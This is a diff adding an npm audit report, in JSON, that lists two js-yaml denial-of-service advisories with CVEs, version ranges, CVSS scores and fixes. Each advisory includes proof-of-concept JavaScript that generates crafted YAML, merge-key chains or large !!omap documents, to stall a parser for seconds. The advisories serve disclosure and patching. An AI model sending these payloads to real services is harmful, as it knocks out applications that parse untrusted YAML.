@@ -1,0 +1,99 @@
+{
+  "actions": [],
+  "advisories": {
+    "1123911": {
+      "findings": [
+        {
+          "version": "4.2.0",
+          "paths": [
+            ".>eslint>@eslint/eslintrc>js-yaml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-52cp-r559-cp3m\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59869\n- https://github.com/nodeca/js-yaml/commit/24f13e79ee1343a7e30bd6f6c9d9cdbf0ac9b2b7\n- https://github.com/nodeca/js-yaml/commit/59423c6f8cdc78742ac00e25a4dd39ef16b702e4\n- https://github.com/nodeca/js-yaml/releases/tag/3.15.0\n- https://github.com/nodeca/js-yaml/releases/tag/4.3.0\n- https://github.com/advisories/GHSA-52cp-r559-cp3m",
+      "created": "2026-07-20T21:19:09.000Z",
+      "id": 1123911,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\njs-yaml can spend quadratic CPU time parsing a document whose size grows only linearly. The issue is triggered by a chain of mappings where each mapping merges the previous one:\n\n```yaml\na0: &a0 { k0: 0 }\na1: &a1 { <<: *a0, k1: 1 }\na2: &a2 { <<: *a1, k2: 2 }\na3: &a3 { <<: *a2, k3: 3 }\n...\nb: *aN\n```\n\nFor each new mapping, the loader has to enumerate the keys inherited from the previous mapping. With N chained mappings, this results in roughly 1 + 2 + ... + N merged-key visits, i.e., O(N^2) work for O(N) input size.\n\n### PoC\n\nFrom N = 4000 delay become > 1s (doc size < 100K)\n\n```js\nimport { performance } from 'node:perf_hooks'\nimport { Buffer } from 'node:buffer'\nimport { load, YAML11_SCHEMA } from 'js-yaml'\n\nconst n = Number(process.argv[2] || 4000)\n\nfunction makeMergeChain (count) {\n  const lines = ['a0: &a0 { k0: 0 }']\n\n  for (let i = 1; i < count; i++) {\n    lines.push(`a${i}: &a${i} { <<: *a${i - 1}, k${i}: ${i} }`)\n  }\n\n  lines.push(`b: *a${count - 1}`)\n  return `${lines.join('\\n')}\\n`\n}\n\nconst source = makeMergeChain(n)\n\nconsole.log(source.split('\\n').slice(0, 8).join('\\n'))\nconsole.log('...')\nconsole.log(source.split('\\n').slice(-4).join('\\n'))\nconsole.log()\nconsole.log(`N: ${n}`)\nconsole.log(`YAML size: ${Buffer.byteLength(source)} bytes`)\n\nconst started = performance.now()\nconst result = load(source, { schema: YAML11_SCHEMA })\nconst elapsed = performance.now() - started\n\nconsole.log(`parse time: ${elapsed.toFixed(1)} ms`)\nconsole.log(`top-level keys: ${Object.keys(result).length}`)\nconsole.log(`b keys: ${Object.keys(result.b).length}`)\n```\n\n### Patches\n\nFix released. The most robust protection is to limit the total number of merged keys per parse call. This should close all past and future edge cases with merge. The default 10K-key limit should be okay in most cases.",
+      "reported_by": null,
+      "title": "js-yaml: YAML merge-key chains can force quadratic CPU consumption",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59869"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "js-yaml",
+      "vulnerable_versions": ">=4.0.0 <4.3.0",
+      "github_advisory_id": "GHSA-52cp-r559-cp3m",
+      "recommendation": "Upgrade to version 4.3.0 or later",
+      "patched_versions": ">=4.3.0",
+      "updated": "2026-07-20T21:19:10.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-52cp-r559-cp3m"
+    },
+    "1123913": {
+      "findings": [
+        {
+          "version": "5.2.0",
+          "paths": [
+            ".>nx>@yarnpkg/parsers>js-yaml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-724g-mxrg-4qvm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59870\n- https://github.com/nodeca/js-yaml/commit/39f3211a2f01b3c6982710cf21434ab7060acefe\n- https://github.com/nodeca/js-yaml/releases/tag/5.2.1\n- https://github.com/advisories/GHSA-724g-mxrg-4qvm",
+      "created": "2026-07-20T21:18:51.000Z",
+      "id": 1123913,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`js-yaml` v5.x introduces `YAML11_SCHEMA` support with the `!!omap` (ordered map) tag. The `omapTag.addItem()` function performs a linear O(n) scan for duplicate key detection on every insertion, resulting in O(n^2) total time to parse a document with n omap entries. An attacker can send a small crafted YAML document to trigger a multi-second CPU stall in any application that uses `yaml.load()` with `{ schema: yaml.YAML11_SCHEMA }`.\n\n### Details\nIn `src/tag/sequence/omap.ts` (compiled: `dist/js-yaml.cjs.js:510-525`):\n```js\nvar omapTag = defineSequenceTag('tag:yaml.org,2002:omap', {\n    create: () => [],\n    addItem: (container, item) => {\n        // ...\n        for (const existing of container)   // O(n) per insertion!\n            if (hasOwnProperty(existing, itemKeys[0]))\n                return 'cannot resolve an ordered map item';\n        container.push(object);             // n insertions → O(n^2) total\n        return '';\n    }\n});\n```\nFor a document with `n` unique entries, insertion i scans i−1 existing entries, yielding 1+2+…+n = **O(n²)** total work.\n\n### PoC (runtime-confirmed on v5.2.0)\n```js\nconst yaml = require('js-yaml');\nfunction buildOmapPayload(n) {\n  let p = '!!omap\\n';\n  for (let i = 0; i < n; i++) p += '- key' + i + ': val' + i + '\\n';\n  return p;\n}\n// Timing results on v5.2.0:\n// n=1000:  9ms\n// n=5000:  73ms  (5x n → 8x time)\n// n=10000: 255ms (2x n → 3.5x time — supralinear)\n// n=20000: 997ms (2x n → 3.9x time — O(n²) confirmed)\n// n=50000: 10613ms          ← blocks event loop for >10 seconds\nyaml.load(buildOmapPayload(50000), { schema: yaml.YAML11_SCHEMA });\n```\n\n### Impact\nAny application that parses untrusted YAML using `yaml.load(input, { schema: yaml.YAML11_SCHEMA })` is vulnerable to Denial of Service. A ~2 MB payload of 50,000 entries blocks the Node.js event loop for 10+ seconds. Smaller payloads (5,000 entries, ~100 KB) already cause noticeable slowdowns (73 ms per parse, amplified under concurrent load).\n\nThis affects the newly released 5.x series (first published 2026-06-20) which adds YAML 1.1/1.2 schema support including `!!omap`. The 4.x series is unaffected (no `YAML11_SCHEMA` export).\n\n### Fix\nReplace the O(n) linear scan in `addItem` with an O(1) `Set`-based lookup:\n```js\nvar omapTag = defineSequenceTag('tag:yaml.org,2002:omap', {\n    create: () => ({ list: [], seen: new Set() }),\n    addItem: (state, item) => {\n        const key = Object.keys(item)[0];\n        if (state.seen.has(key)) return 'duplicate omap key';\n        state.seen.add(key);\n        state.list.push(item);\n        return '';\n    },\n    resolve: (state) => state.list\n});\n```",
+      "reported_by": null,
+      "title": "js-yaml: Quadratic-complexity (O(n^2)) DoS via !!omap tag in YAML11_SCHEMA",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59870"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "js-yaml",
+      "vulnerable_versions": ">=5.0.0 <=5.2.0",
+      "github_advisory_id": "GHSA-724g-mxrg-4qvm",
+      "recommendation": "Upgrade to version 5.2.1 or later",
+      "patched_versions": ">=5.2.1",
+      "updated": "2026-07-20T21:18:53.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-407",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-724g-mxrg-4qvm"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 1,
+      "high": 1,
+      "critical": 0
+    },
+    "dependencies": 1500,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1500
+  }
+}
